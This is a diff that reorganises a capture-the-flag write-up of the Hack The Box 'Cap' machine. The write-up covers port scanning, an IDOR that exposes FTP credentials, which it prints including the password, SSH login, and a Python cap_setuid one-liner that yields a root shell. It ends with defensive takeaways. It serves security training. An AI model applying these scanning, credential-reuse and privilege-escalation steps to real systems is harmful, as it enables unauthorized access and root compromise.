@@ -36,125 +36,6 @@ The supplied RustScan output identified three exposed services:
 | 80/tcp | HTTP | Cap's dashboard and capture download functionality. |
 
 ```bash
-rustscan -a LAB_IP -u 5000 -- -sS -T4
-```
-
-The HTTP application presents a dashboard with security snapshots and packet-capture analysis. The first two screenshots preserve the web enumeration sequence from the source notes.
-
-<figure class="htb-figure">
-  <img class="htb-screenshot" src="images/image-1.png" alt="Cap web application dashboard" loading="lazy">
-  <figcaption><strong>Figure 1.</strong> The Cap dashboard exposed on port 80.</figcaption>
-</figure>
-
-<figure class="htb-figure">
-  <img class="htb-screenshot" src="images/image-2.png" alt="Cap packet capture data view" loading="lazy">
-  <figcaption><strong>Figure 2.</strong> A packet-capture data view exposed by the dashboard.</figcaption>
-</figure>
-
-## 2. Exploit the capture IDOR
-
-The application exposes capture records through a numeric path. Changing the capture identifier from the currently displayed record to another valid identifier reveals a different capture rather than enforcing ownership. The next two screenshots show the record enumeration and the packet contents.
-
-<figure class="htb-figure">
-  <img class="htb-screenshot" src="images/image-3.png" alt="Cap capture identifier enumeration" loading="lazy">
-  <figcaption><strong>Figure 3.</strong> The capture identifier can be changed directly in the URL.</figcaption>
-</figure>
-
-<figure class="htb-figure">
-  <img class="htb-screenshot" src="images/image-4.png" alt="Cap packet capture showing FTP traffic" loading="lazy">
-  <figcaption><strong>Figure 4.</strong> The recovered capture contains FTP authentication traffic.</figcaption>
-</figure>
-
-The FTP stream exposes credentials for the `nathan` account. They are used only against this authorized lab machine:
-
-```text
-username: nathan
-password: Buck3tH4TF0RM3!
-```
-
-The key lesson is that an object identifier is not an authorization check. The server must verify that the current user is allowed to access the requested capture, not merely that the identifier exists.
-
-## 3. Obtain the user shell
-
-Use the recovered credentials to connect over SSH:
-
-```bash
-ssh nathan@LAB_IP
-```
-
-The fifth screenshot shows the authenticated SSH session.
-
-<figure class="htb-figure">
-  <img class="htb-screenshot" src="images/image-5.png" alt="SSH session as nathan on Cap" loading="lazy">
-  <figcaption><strong>Figure 5.</strong> SSH access as `nathan` after reusing the recovered credentials.</figcaption>
-</figure>
-
-The sixth screenshot shows the user-flag check. The flag value is redacted in this published copy.
-
-<figure class="htb-figure">
-  <img class="htb-screenshot" src="images/image-6.png" alt="User flag check on Cap" loading="lazy">
-  <figcaption><strong>Figure 6.</strong> The user-flag check in the authenticated SSH session. The flag value is redacted.</figcaption>
-</figure>
-
-The source notes verified the user flag with:
-
-```bash
-nathan@cap:~$ ls
-user.txt
-
-nathan@cap:~$ cat user.txt
-<USER_FLAG_REDACTED>
-```
-
-## 4. Escalate through Python capabilities
-
-Search the filesystem for Linux file capabilities:
-
-```bash
-nathan@cap:~$ getcap -r / 2>/dev/null
-/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
-/usr/bin/ping = cap_net_raw+ep
-/usr/bin/traceroute6.iputils = cap_net_raw+ep
-/usr/bin/mtr-packet = cap_net_raw+ep
-/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
-```
-
-`cap_setuid` allows the Python interpreter to change its effective UID. Confirm the capability on the interpreter, then start a shell after changing the UID to zero:
-
-```bash
-nathan@cap:~$ getcap /usr/bin/python3.8
-/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
-
-nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
-root@cap:~# whoami
-root
-```
-
-The final screenshot shows the root shell and the flag-read operation. The flag value is redacted in this published copy.
-
-<figure class="htb-figure">
-  <img class="htb-screenshot" src="images/image-7.png" alt="Root shell on Cap" loading="lazy">
-  <figcaption><strong>Figure 7.</strong> Root access obtained through the `cap_setuid` capability on Python. The flag output is redacted.</figcaption>
-</figure>
-
-```bash
-root@cap:~# cd /root
-root@cap:/root# cat root.txt
-<ROOT_FLAG_REDACTED>
-```
-
-## Takeaways
-
-- Treat numeric object identifiers as untrusted input and enforce authorization server-side.
-- Do not expose packet captures containing credentials to users who do not own them.
-- Audit file capabilities regularly; `cap_setuid` on an interpreter is effectively a local privilege-escalation primitive.
-## Complete source command blocks
-
-The following blocks preserve the complete typed commands and terminal output from the supplied source note. Output is kept intact except for user and root flag values, which are represented by the redaction markers used above.
-
-### Source block 1 (`bash`)
-
-```bash
 ┌──(kali㉿Shieldbyte53)-[~]
 └─$ rustscan -a 10.129.6.89 -u 5000 -- -sS -T4
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
@@ -204,14 +85,64 @@ Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
 
 ```
 
-### Source block 2 (`text`)
+The HTTP application presents a dashboard with security snapshots and packet-capture analysis. The first two screenshots preserve the web enumeration sequence from the source notes.
+
+<figure class="htb-figure">
+  <img class="htb-screenshot" src="images/image-1.png" alt="Cap web application dashboard" loading="lazy">
+  <figcaption><strong>Figure 1.</strong> The Cap dashboard exposed on port 80.</figcaption>
+</figure>
+
+<figure class="htb-figure">
+  <img class="htb-screenshot" src="images/image-2.png" alt="Cap packet capture data view" loading="lazy">
+  <figcaption><strong>Figure 2.</strong> A packet-capture data view exposed by the dashboard.</figcaption>
+</figure>
+
+## 2. Exploit the capture IDOR
+
+The application exposes capture records through a numeric path. Changing the capture identifier from the currently displayed record to another valid identifier reveals a different capture rather than enforcing ownership. The next two screenshots show the record enumeration and the packet contents.
+
+<figure class="htb-figure">
+  <img class="htb-screenshot" src="images/image-3.png" alt="Cap capture identifier enumeration" loading="lazy">
+  <figcaption><strong>Figure 3.</strong> The capture identifier can be changed directly in the URL.</figcaption>
+</figure>
+
+<figure class="htb-figure">
+  <img class="htb-screenshot" src="images/image-4.png" alt="Cap packet capture showing FTP traffic" loading="lazy">
+  <figcaption><strong>Figure 4.</strong> The recovered capture contains FTP authentication traffic.</figcaption>
+</figure>
+
+The FTP stream exposes credentials for the `nathan` account. They are used only against this authorized lab machine:
 
 ```text
 username - nathan
 password - Buck3tH4TF0RM3!
 ```
 
-### Source block 3 (`bash`)
+The key lesson is that an object identifier is not an authorization check. The server must verify that the current user is allowed to access the requested capture, not merely that the identifier exists.
+
+## 3. Obtain the user shell
+
+Use the recovered credentials to connect over SSH:
+
+```bash
+ssh nathan@LAB_IP
+```
+
+The fifth screenshot shows the authenticated SSH session.
+
+<figure class="htb-figure">
+  <img class="htb-screenshot" src="images/image-5.png" alt="SSH session as nathan on Cap" loading="lazy">
+  <figcaption><strong>Figure 5.</strong> SSH access as `nathan` after reusing the recovered credentials.</figcaption>
+</figure>
+
+The sixth screenshot shows the user-flag check. The flag value is redacted in this published copy.
+
+<figure class="htb-figure">
+  <img class="htb-screenshot" src="images/image-6.png" alt="User flag check on Cap" loading="lazy">
+  <figcaption><strong>Figure 6.</strong> The user-flag check in the authenticated SSH session. The flag value is redacted.</figcaption>
+</figure>
+
+The source notes verified the user flag with:
 
 ```bash
 nathan@cap:~$ ls
@@ -221,7 +152,18 @@ nathan@cap:~$ cat user.txt
 <USER_FLAG_REDACTED>
 ```
 
-### Source block 4 (`bash`)
+## 4. Escalate through Python capabilities
+
+Search the filesystem for Linux file capabilities. The `cap_setuid` capability allows the Python interpreter to change its effective UID and is the local privilege-escalation primitive used here.
+
+The final screenshot shows the root shell and the flag-read operation. The flag value is redacted in this published copy.
+
+<figure class="htb-figure">
+  <img class="htb-screenshot" src="images/image-7.png" alt="Root shell on Cap" loading="lazy">
+  <figcaption><strong>Figure 7.</strong> Root access obtained through the `cap_setuid` capability on Python. The flag output is redacted.</figcaption>
+</figure>
+
+The complete privilege-escalation terminal output from the source note is preserved below:
 
 ```bash
 nathan@cap:~$ getcap -r / 2>/dev/null
@@ -243,3 +185,9 @@ root@cap:/root# cat root.txt
 
 root@cap:/root#
 ```
+
+## Takeaways
+
+- Treat numeric object identifiers as untrusted input and enforce authorization server-side.
+- Do not expose packet captures containing credentials to users who do not own them.
+- Audit file capabilities regularly; `cap_setuid` on an interpreter is effectively a local privilege-escalation primitive.
